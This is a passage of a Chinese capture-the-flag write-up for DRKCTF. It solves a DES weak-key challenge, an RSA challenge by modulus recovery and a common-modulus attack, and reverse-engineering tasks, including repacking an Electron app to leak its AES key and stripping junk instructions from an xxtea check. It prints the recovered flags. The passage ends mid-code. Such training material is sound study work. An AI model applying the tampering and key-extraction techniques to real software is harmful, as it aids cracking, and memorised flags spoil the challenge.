class="number">0xFE</span>,<span class="number">0xFE</span>,<span class="number">0xFE</span>,<span class="number">0xFE</span>&#125;,</span><br><span class="line"><span class="number">123</span>     &#123;<span class="number">0x1F</span>,<span class="number">0x1F</span>,<span class="number">0x1F</span>,<span class="number">0x1F</span>,<span class="number">0x0E</span>,<span class="number">0x0E</span>,<span class="number">0x0E</span>,<span class="number">0x0E</span>&#125;,</span><br><span class="line"><span class="number">124</span>     &#123;<span class="number">0xE0</span>,<span class="number">0xE0</span>,<span class="number">0xE0</span>,<span class="number">0xE0</span>,<span class="number">0xF1</span>,<span class="number">0xF1</span>,<span class="number">0xF1</span>,<span class="number">0xF1</span>&#125;,</span><br><span class="line"><span class="number">125</span>     <span class="comment">/* semi-weak keys */</span></span><br><span class="line"><span class="number">126</span>     &#123;<span class="number">0x01</span>,<span class="number">0xFE</span>,<span class="number">0x01</span>,<span class="number">0xFE</span>,<span class="number">0x01</span>,<span class="number">0xFE</span>,<span class="number">0x01</span>,<span class="number">0xFE</span>&#125;,</span><br><span class="line"><span class="number">127</span>     &#123;<span class="number">0xFE</span>,<span class="number">0x01</span>,<span class="number">0xFE</span>,<span class="number">0x01</span>,<span class="number">0xFE</span>,<span class="number">0x01</span>,<span class="number">0xFE</span>,<span class="number">0x01</span>&#125;,</span><br><span class="line"><span class="number">128</span>     &#123;<span class="number">0x1F</span>,<span class="number">0xE0</span>,<span class="number">0x1F</span>,<span class="number">0xE0</span>,<span class="number">0x0E</span>,<span class="number">0xF1</span>,<span class="number">0x0E</span>,<span class="number">0xF1</span>&#125;,</span><br><span class="line"><span class="number">129</span>     &#123;<span class="number">0xE0</span>,<span class="number">0x1F</span>,<span class="number">0xE0</span>,<span class="number">0x1F</span>,<span class="number">0xF1</span>,<span class="number">0x0E</span>,<span class="number">0xF1</span>,<span class="number">0x0E</span>&#125;,</span><br><span class="line"><span class="number">130</span>     &#123;<span class="number">0x01</span>,<span class="number">0xE0</span>,<span class="number">0x01</span>,<span class="number">0xE0</span>,<span class="number">0x01</span>,<span class="number">0xF1</span>,<span class="number">0x01</span>,<span class="number">0xF1</span>&#125;,</span><br><span class="line"><span class="number">131</span>     &#123;<span class="number">0xE0</span>,<span class="number">0x01</span>,<span class="number">0xE0</span>,<span class="number">0x01</span>,<span class="number">0xF1</span>,<span class="number">0x01</span>,<span class="number">0xF1</span>,<span class="number">0x01</span>&#125;,</span><br><span class="line"><span class="number">132</span>     &#123;<span class="number">0x1F</span>,<span class="number">0xFE</span>,<span class="number">0x1F</span>,<span class="number">0xFE</span>,<span class="number">0x0E</span>,<span class="number">0xFE</span>,<span class="number">0x0E</span>,<span class="number">0xFE</span>&#125;,</span><br><span class="line"><span class="number">133</span>     &#123;<span class="number">0xFE</span>,<span class="number">0x1F</span>,<span class="number">0xFE</span>,<span class="number">0x1F</span>,<span class="number">0xFE</span>,<span class="number">0x0E</span>,<span class="number">0xFE</span>,<span class="number">0x0E</span>&#125;,</span><br><span class="line"><span class="number">134</span>     &#123;<span class="number">0x01</span>,<span class="number">0x1F</span>,<span class="number">0x01</span>,<span class="number">0x1F</span>,<span class="number">0x01</span>,<span class="number">0x0E</span>,<span class="number">0x01</span>,<span class="number">0x0E</span>&#125;,</span><br><span class="line"><span class="number">135</span>     &#123;<span class="number">0x1F</span>,<span class="number">0x01</span>,<span class="number">0x1F</span>,<span class="number">0x01</span>,<span class="number">0x0E</span>,<span class="number">0x01</span>,<span class="number">0x0E</span>,<span class="number">0x01</span>&#125;,</span><br><span class="line"><span class="number">136</span>     &#123;<span class="number">0xE0</span>,<span class="number">0xFE</span>,<span class="number">0xE0</span>,<span class="number">0xFE</span>,<span class="number">0xF1</span>,<span class="number">0xFE</span>,<span class="number">0xF1</span>,<span class="number">0xFE</span>&#125;,</span><br><span class="line"><span class="number">137</span>     &#123;<span class="number">0xFE</span>,<span class="number">0xE0</span>,<span class="number">0xFE</span>,<span class="number">0xE0</span>,<span class="number">0xFE</span>,<span class="number">0xF1</span>,<span class="number">0xFE</span>,<span class="number">0xF1</span>&#125;&#125;;</span><br></pre></td></tr></table></figure><h2 id="有弱密钥的加密算法"><a href="#有弱密钥的加密算法" class="headerlink" title="有弱密钥的加密算法"></a>有弱密钥的加密算法</h2><ul><li>DES</li><li>RC4</li><li>IDEA</li><li>Blowfish</li></ul></blockquote><p>摘抄完QAQ，再根据提示</p><p>二次加密得到明文</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;t\xe4f\x19\xc6\xef\xaaL\xc3R&#125;\x08;K\xc9\x88\xa6|\nF\xc3\x12h\xcd\xd3x\xc3(\x91\x08\x841\xca\x8b\xc1\x94\xb5\x9f[\xcd\xc6\x9f\xf9\xf6\xca\xf5\x1a\xda\x16\xcf\x89\x154\xa1\xfe\xc5\x16\xcf\x89\x154\xa1\xfe\xc5&#x27;</span></span><br><span class="line">key = <span class="string">&#x27;0101010101010101&#x27;</span></span><br><span class="line">key = <span class="built_in">bytes</span>.fromhex(key)</span><br><span class="line">des = DES.new(key, DES.MODE_ECB)</span><br><span class="line"></span><br><span class="line">enc = des.encrypt(pad(flag,<span class="number">64</span>))</span><br><span class="line"><span class="built_in">print</span>(enc[:enc.find(<span class="string">b&#x27;&#125;&#x27;</span>)+<span class="number">1</span>])</span><br><span class="line"><span class="comment">#b&#x27;DRKCTF&#123;We4k_K3y_1s_V3ry_D4nger0us_In_DES&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="MidRSA"><a href="#MidRSA" class="headerlink" title="MidRSA"></a>MidRSA</h3><div class="tip warning faa-parent animated-hover"><p class="faa-horizontal">这道题没写完</p></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_Key1</span>(<span class="params">ebits</span>):</span><br><span class="line">    e = [getPrime(ebits) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line">    <span class="keyword">return</span> e</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt1</span>(<span class="params">message,e</span>):</span><br><span class="line">    n = gmpy2.next_prime(bytes_to_long(message) &lt;&lt; <span class="number">300</span>)</span><br><span class="line">    m = getPrime(<span class="number">256</span>)</span><br><span class="line">    c = [<span class="built_in">int</span>(<span class="built_in">pow</span>(m,e[i],n)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(e))]</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_Key2</span>(<span class="params">nbits</span>):</span><br><span class="line">    p = getPrime(nbits // <span class="number">2</span>)</span><br><span class="line">    q = getPrime(nbits // <span class="number">2</span>)</span><br><span class="line">    n = p*q</span><br><span class="line">    e = [random.getrandbits(nbits // <span class="number">4</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">    <span class="keyword">return</span> n,e</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt2</span>(<span class="params">message,e,n</span>):</span><br><span class="line">    m = bytes_to_long(message)</span><br><span class="line">    c = [<span class="built_in">int</span>(<span class="built_in">pow</span>(m,e[i],n)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(e))]</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line">    </span><br><span class="line"><span class="keyword">assert</span> flag.startswith(<span class="string">b&quot;DRKCTF&#123;&quot;</span>)</span><br><span class="line"></span><br><span class="line">flag1 = flag[:<span class="built_in">len</span>(flag)//<span class="number">2</span>]</span><br><span class="line">flag2 = flag[<span class="built_in">len</span>(flag)//<span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line">ebits = <span class="number">7</span></span><br><span class="line">e1 = generate_Key1(ebits)</span><br><span class="line">cipher1 = encrypt1(flag1,e1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;e1 =&quot;</span>,e1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;cipher1 =&quot;</span>,cipher1)</span><br><span class="line"></span><br><span class="line">nbits = <span class="number">1024</span></span><br><span class="line">n,e2 = generate_Key2(nbits)</span><br><span class="line">cipher2 = encrypt2(flag2,e2,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;e2 =&quot;</span>,e2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;cipher2 =&quot;</span>,cipher2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n =&quot;</span>,n)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">e1 = [109, 71, 109, 73]</span></span><br><span class="line"><span class="string">cipher1 = [36272047346364825234770733058042613197790911431212158822254782055957208837848605160852567043492625692783344073921185227328379941291979083011033, 13421582077901767047291741873622169312010984740586925881415103229648835151589774736786336965745532072099996467445790339749720696886313635920080, 36272047346364825234770733058042613197790911431212158822254782055957208837848605160852567043492625692783344073921185227328379941291979083011033, 41425183140413487232780768389488969603566343428250573532166425276868000949579663990819005141199597640625439816343697426958648927294289659127871]</span></span><br><span class="line"><span class="string">e2 = [79572758141493570128961125255246129069540961757778793209698370333142346488381, 80555585862127636800866563977080055603517001358195529410497461746213789997225, 44651921320695090688745333790065512192118202496468714141526113242887125432380]</span></span><br><span class="line"><span class="string">cipher2 = [58600444300331800249882073146233995912287198739549440714207984476331259754331716531491187240053630185776787152600165426285021284302994699108557023545574315706006132536588848833818758624067461985444940651823107522770906474037882323326792755635934081822967331031854184791299228513024491344725765476710816941057, 16511944800191885973496391252612222059697387587833308714567450121364756390806094606646424594583975159634952911600665271092389815248477961923357683297311169260578508157717777465241680062644118354471550223231057620392252324514411927096940875466794869671163453991620492008856178108060167556176019729800517994337, 80885008609388989196377721090246742575908473911131498982960117640742106565184297197238656375198284856442596226398287448931285735903463892735111244609358611618958293002176923706195402338331128766464276441210238388187625107435781170368017908610916585774514676482124401329575553658828115269495158818527164441546]</span></span><br><span class="line"><span class="string">n = 93468142044831350317940409833603031534515663349871776634867176846669780024082517910566484997161088199091160371537367121403194814422867749777235397168852158723228851090445429617275680206703935781244466363279841409768649097588586494453125840436600639420286950914680651600232197982546122764845043227394567787283</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>第一部分</p>这里有两个c，知道n是m<<300，只要找到模数n，就找到了m，构造$c_i=m^{e_i} \mod n$改写成${c_i}^{e_j}={{m^{e_i}}^{e_j}} ={c_j}^{e_i}\mod n$<p>这样两数之差就是kn，再来一个kn，求gcd即可</p><p>第二部分</p><p>这里重看一下共模攻击和CRT：</p><p><a href="https://www.cnblogs.com/ailanxier/p/13370753.html">中国剩余定理(CRT)及其扩展(EXCRT)详解 - ailanxier - 博客园 (cnblogs.com)</a></p><p>这里要想到三个e对应三个方程，不能简单当成gcd(e1,e2,e3)</p><p>把它当成两次共模攻击</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># from prism import *</span></span><br><span class="line"><span class="comment"># from math import *</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e1 = [<span class="number">109</span>, <span class="number">71</span>, <span class="number">109</span>, <span class="number">73</span>]</span><br><span class="line">cipher1 = [<span class="number">36272047346364825234770733058042613197790911431212158822254782055957208837848605160852567043492625692783344073921185227328379941291979083011033</span>, <span class="number">13421582077901767047291741873622169312010984740586925881415103229648835151589774736786336965745532072099996467445790339749720696886313635920080</span>, <span class="number">36272047346364825234770733058042613197790911431212158822254782055957208837848605160852567043492625692783344073921185227328379941291979083011033</span>, <span class="number">41425183140413487232780768389488969603566343428250573532166425276868000949579663990819005141199597640625439816343697426958648927294289659127871</span>]</span><br><span class="line"></span><br><span class="line">d1 = cipher1[<span class="number">0</span>]**e1[<span class="number">1</span>] - cipher1[<span class="number">1</span>]**e1[<span class="number">0</span>]</span><br><span class="line">d2 = cipher1[<span class="number">2</span>]**e1[<span class="number">3</span>] - cipher1[<span class="number">3</span>]**e1[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">n = gcd(d1,d2)</span><br><span class="line"></span><br><span class="line">m1 = n&gt;&gt;<span class="number">300</span></span><br><span class="line"><span class="comment"># print(long_to_bytes(m1))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e2 = [<span class="number">79572758141493570128961125255246129069540961757778793209698370333142346488381</span>, <span class="number">80555585862127636800866563977080055603517001358195529410497461746213789997225</span>, <span class="number">44651921320695090688745333790065512192118202496468714141526113242887125432380</span>]</span><br><span class="line">c2 = [<span class="number">58600444300331800249882073146233995912287198739549440714207984476331259754331716531491187240053630185776787152600165426285021284302994699108557023545574315706006132536588848833818758624067461985444940651823107522770906474037882323326792755635934081822967331031854184791299228513024491344725765476710816941057</span>, <span class="number">16511944800191885973496391252612222059697387587833308714567450121364756390806094606646424594583975159634952911600665271092389815248477961923357683297311169260578508157717777465241680062644118354471550223231057620392252324514411927096940875466794869671163453991620492008856178108060167556176019729800517994337</span>, <span class="number">80885008609388989196377721090246742575908473911131498982960117640742106565184297197238656375198284856442596226398287448931285735903463892735111244609358611618958293002176923706195402338331128766464276441210238388187625107435781170368017908610916585774514676482124401329575553658828115269495158818527164441546</span>]</span><br><span class="line">n = <span class="number">93468142044831350317940409833603031534515663349871776634867176846669780024082517910566484997161088199091160371537367121403194814422867749777235397168852158723228851090445429617275680206703935781244466363279841409768649097588586494453125840436600639420286950914680651600232197982546122764845043227394567787283</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">egcd</span>(<span class="params">a, b</span>):</span><br><span class="line">  <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">    <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    g, y, x = egcd(b % a, a)</span><br><span class="line">    <span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">modinv</span>(<span class="params">a, m</span>):</span><br><span class="line">  g, x, y = egcd(a, m)</span><br><span class="line">  <span class="keyword">if</span> g != <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&#x27;modular inverse does not exist&#x27;</span>)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">return</span> x % m</span><br><span class="line"></span><br><span class="line">_,s1, s2 = gmpy2.gcdext(e2[<span class="number">0</span>],e2[<span class="number">1</span>])</span><br><span class="line"><span class="comment"># print(s)</span></span><br><span class="line"><span class="keyword">if</span> s1&lt;<span class="number">0</span>:</span><br><span class="line">    s1 = - s1</span><br><span class="line">    c2[<span class="number">0</span>] = modinv(c2[<span class="number">0</span>], n)</span><br><span class="line"><span class="keyword">elif</span> s2&lt;<span class="number">0</span>:</span><br><span class="line">    s2 = - s2</span><br><span class="line">    c2[<span class="number">1</span>] = modinv(c2[<span class="number">1</span>], n)</span><br><span class="line"><span class="comment"># print(t)</span></span><br><span class="line">m2 = <span class="built_in">pow</span>(c2[<span class="number">0</span>], s1, n) * <span class="built_in">pow</span>(c2[<span class="number">1</span>], s2, n) % n</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m1)+long_to_bytes(m2))</span><br><span class="line"><span class="comment">#b&#x27;DRKCTF&#123;5d0b96e8-e069-4378-82e7-120e4b761a0b&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><h3 id="elec-go"><a href="#elec-go" class="headerlink" title="elec_go"></a>elec_go</h3><p>佬出的题，第一次见</p><p>根据</p><p><a href="https://www.52pojie.cn/thread-1847258-1-1.html">Electron编写的exe 逆向思路 - 『脱壳破解区』 - 吾爱破解 - LCG - LSG |安卓破解|病毒分析|www.52pojie.cn</a></p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">npm install asar -<span class="keyword">g</span></span><br><span class="line"><span class="keyword">cd</span> apps</span><br><span class="line">asar extract <span class="keyword">app</span>.asar <span class="keyword">app</span> <span class="comment">//解压拿到源码</span></span><br><span class="line">asar pack <span class="keyword">app</span> <span class="keyword">app</span>.asar <span class="comment">//重新打包</span></span><br></pre></td></tr></table></figure><p>打开js源代码，有一个base64，解密之后发现是aes，但是不知道key，直接写一个</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">  dialog.<span class="title function_">showMessageBox</span>(&#123;</span><br><span class="line">    <span class="attr">message</span>: <span class="string">`k3y 的值是：<span class="subst">$&#123;k3y.toString()&#125;</span>`</span>,</span><br><span class="line">    <span class="attr">buttons</span>: [<span class="string">&#x27;OK&#x27;</span>]</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>重新打包，拿到key的值，在线解密</p><p><img src="https://s2.loli.net/2024/05/30/ugIApJS6XdPciaH.png" alt="image-20240530225931951"></p><h3 id="flower-tea"><a href="#flower-tea" class="headerlink" title="flower_tea"></a>flower_tea</h3><p>在这里说一下出题思路吧QAQ</p><p>这个题本来是想考一下去花指令的，没想到有佬直接调出来了，tql</p><p>花指令基本都很萌新QAQ，对栈做操作或者call，ret。</p><p>想了一下，可能反调试比花出的还好一点。毕竟x64的和x86有一点不一样。</p><p>感觉还有可以改进的地方：</p><p>隐藏交叉引用-用多级指针来隐藏交叉引用<br>真tea中jmp修正为jz和jnz，这样能起到一些混淆的作用<br>防止附加调试-在scanf之后再次判断调试状态，修改hook</p><p>但是都不会QAQ，还是要好好学，下面抄的官方wp</p><p>观察main函数：<br>主函数的大概是这样。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/33730407/1716733828856-dd977d3e-329b-4748-adea-648e1ca77d81.png#averageHue=%2320201f&clientId=u9fbe6832-1fb1-4&from=paste&id=u4cff4822&originHeight=843&originWidth=1134&originalType=url&ratio=1&rotation=0&showTitle=false&size=45021&status=done&style=none&taskId=ucfe2b2a2-9d0a-4981-9d9d-5cd31dff461&title=" alt="image.png"><br>如果要调试，要先把第一个函数nop掉（实际上并不用）<br>这里先看encode函数，点开后是爆红的，所以先解花指令<br><img src="https://cdn.nlark.com/yuque/0/2024/png/33730407/1716733828863-fffea6a3-e0ed-4f7f-bd78-ba319fdb93b0.png#averageHue=%23242120&clientId=u9fbe6832-1fb1-4&from=paste&id=u640b1518&originHeight=256&originWidth=819&originalType=url&ratio=1&rotation=0&showTitle=false&size=27837&status=done&style=none&taskId=ub41b481a-0633-41c0-9641-9f79986b3f5&title=" alt="image.png"><br>这个是一个简单的jmp花指令，把后面的jmp nop掉，然后可以看到第一部分。<br>这时最上面还是有标红<br>在汇编界面看看哪里还有花<br><img src="https://cdn.nlark.com/yuque/0/2024/png/33730407/1716733828840-9379adb2-bb79-47ec-8e66-6b0b6186244b.png#averageHue=%23211f1f&clientId=u9fbe6832-1fb1-4&from=paste&id=uf2076b9a&originHeight=447&originWidth=1027&originalType=url&ratio=1&rotation=0&showTitle=false&size=46966&status=done&style=none&taskId=ue7e65699-3668-4960-a21a-b46ea68bd25&title=" alt="image.png"><br>这里有一个奇怪的call：<br>逻辑是：call完之后把ret的值+0xC然后返回<br>把这一部分按u解除，在加0xC后的位置再反编译<br><img src="https://cdn.nlark.com/yuque/0/2024/png/33730407/1716733828855-22c55bc8-7fc2-4b83-8efb-7c1c9f6b986d.png#averageHue=%23222121&clientId=u9fbe6832-1fb1-4&from=paste&id=u8a8a33d3&originHeight=902&originWidth=982&originalType=url&ratio=1&rotation=0&showTitle=false&size=57530&status=done&style=none&taskId=u0a4f5158-d428-47e8-be3d-870a551763d&title=" alt="image.png"><br>所以ret之后就会到pop的位置<br>把中间这一段全部nop，然后把整个函数u，然后c，再浏览一下函数，中间有一个怪jmp，删掉<br><img src="https://cdn.nlark.com/yuque/0/2024/png/33730407/1716733828869-884a2f60-9285-4f64-90a8-423fd0e572e7.png#averageHue=%23383a2d&clientId=u9fbe6832-1fb1-4&from=paste&id=u4183dfaa&originHeight=914&originWidth=1121&originalType=url&ratio=1&rotation=0&showTitle=false&size=50453&status=done&style=none&taskId=u23ab1c10-a1fa-4e75-af1b-62ab76f52ea&title=" alt="image.png"><br>然后再p，得到解完花的函数</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall encode(__int64 a1, __int64 a2)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; // rcx</span><br><span class="line"> <span class="built_in"> int </span>v3; // eax</span><br><span class="line">  bool v4; // zf</span><br><span class="line"> <span class="built_in"> int </span>v5; // eax</span><br><span class="line"> <span class="built_in"> int </span>v7; // [rsp+2Ch] [rbp-34h]</span><br><span class="line"> <span class="built_in"> int </span>v8; // [rsp+30h] [rbp-30h]</span><br><span class="line">  unsigned<span class="built_in"> int </span>i; // [rsp+34h] [rbp-2Ch]</span><br><span class="line">  unsigned<span class="built_in"> int </span>v10; // [rsp+38h] [rbp-28h]</span><br><span class="line">  unsigned<span class="built_in"> int </span>v11; // [rsp+3Ch] [rbp-24h]</span><br><span class="line">  unsigned<span class="built_in"> int </span>v12; // [rsp+40h] [rbp-20h]</span><br><span class="line"> <span class="built_in"> int </span>v13; // [rsp+44h] [rbp-1Ch]</span><br><span class="line">  _BYTE v15[12]; // [rsp+54h] [rbp-Ch]</span><br><span class="line"></span><br><span class="line">  *(_QWORD *)&amp;v15[4] = a1;</span><br><span class="line">  *(_DWORD *)v15 = 0x9E3779B9;</span><br><span class="line">  v8 = 9;</span><br><span class="line">  v10 = 0;</span><br><span class="line">  v11 = *(_DWORD *)(a1 + 56);</span><br><span class="line">  do</span><br><span class="line">  &#123;</span><br><span class="line">    v10 -= 0x61C88647;</span><br><span class="line">    v7 = (v10 &gt;&gt; 2) &amp; 3;</span><br><span class="line">    for ( i = 0; ; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = 14i64;</span><br><span class="line">     <span class="built_in"> if </span>( i &gt;= 0xE )</span><br><span class="line">        break;</span><br><span class="line">      v12 = *(_DWORD *)(*(_QWORD *)&amp;v15[4] + 4i64 * (i + 1));</span><br><span class="line">      v3 = *(_DWORD *)(*(_QWORD *)&amp;v15[4] + 4i64 * i)</span><br><span class="line">         + (((v11 ^ *(_DWORD *)(a2 + 4i64 * (v7 ^ i &amp; 3))) + (v12 ^ v10)) ^ (((16 * v11) ^ (v12 &gt;&gt; 3))</span><br><span class="line">                                                                           + ((4 * v12) ^ (v11 &gt;&gt; 5))));</span><br><span class="line">      *(_DWORD *)(*(_QWORD *)&amp;v15[4] + 4i64 * i) = v3;</span><br><span class="line">      v11 = v3;</span><br><span class="line">    &#125;</span><br><span class="line">    v4 = **(_QWORD **)&amp;v15[4] == 0xEi64;</span><br><span class="line">    **(_QWORD **)&amp;v15[4] ^= 0xEui64;</span><br><span class="line">   <span class="built_in"> if </span>( v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = *(_QWORD *)v15;</span><br><span class="line">      **(_QWORD **)&amp;v15[4] += *(_QWORD *)v15;</span><br><span class="line">    &#125;</span><br><span class="line">    **(_QWORD **)&amp;v15[4] ^= v2;</span><br><span class="line">    v5 = *(_DWORD *)(*(_QWORD *)&amp;v15[4] + 56i64)</span><br><span class="line">       + (((v11 ^ *(_DWORD *)(a2 + 4i64 * (v7 ^ i &amp; 3))) + (**(_DWORD **)&amp;v15[4] ^ v10)) ^ (((16 * v11) ^ (**(_DWORD **)&amp;v15[4] &gt;&gt; 3))</span><br><span class="line">                                                                                          + ((4 * **(_DWORD **)&amp;v15[4]) ^ (v11 &gt;&gt; 5))));</span><br><span class="line">    *(_DWORD *)(*(_QWORD *)&amp;v15[4] + 56i64) = v5;</span><br><span class="line">    v11 = v5;</span><br><span class="line">    --v8;</span><br><span class="line">  &#125;</span><br><span class="line">  while ( v8 );</span><br><span class="line">  v13 = 60;</span><br><span class="line">  while ( v13 != 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    --v13;</span><br><span class="line">   <span class="built_in"> if </span>( *(unsigned __int8 *)(*(_QWORD *)&amp;v15[4] + v13) != (byte_7FF7A5187000[v13 + 1] ^ 0x23) )</span><br><span class="line">     <span class="built_in"> return </span>0;</span><br><span class="line">  &#125;</span><br><span class="line"> <span class="built_in"> return </span>1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个的特征很明显是xxtea，并且没有魔改，网上直接搜脚本<br>exp：(需要用clang)<br>(网上的脚本<a href="https://www.cnblogs.com/zpchcbd/p/15974293.html">https://www.cnblogs.com/zpchcbd/p/15974293.html</a>)</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 